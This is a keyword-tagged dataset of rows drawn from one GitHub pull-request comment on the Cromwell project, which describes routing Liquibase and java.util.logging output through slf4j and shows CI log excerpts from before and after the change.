https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:87,Integrability,message,messages,87,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:263,Integrability,Message,Message,263,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1703,Integrability,Message,Message,1703,":59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). #",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2516,Integrability,rout,routed,2516,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2610,Integrability,message,messages,2610,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3045,Integrability,message,messages,3045,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:467,Modifiability,rewrite,rewriteBatchedStatements,467,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1522,Modifiability,config,configuration,1522,"ationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1912,Modifiability,rewrite,rewriteBatchedStatements,1912," 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.ut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2412,Modifiability,config,configuration,2412,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2638,Modifiability,config,configured,2638,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2948,Modifiability,config,configured,2948,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2980,Modifiability,config,configured,2980,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:3400,Performance,load,load,3400,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:13,Testability,log,logging,13,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532
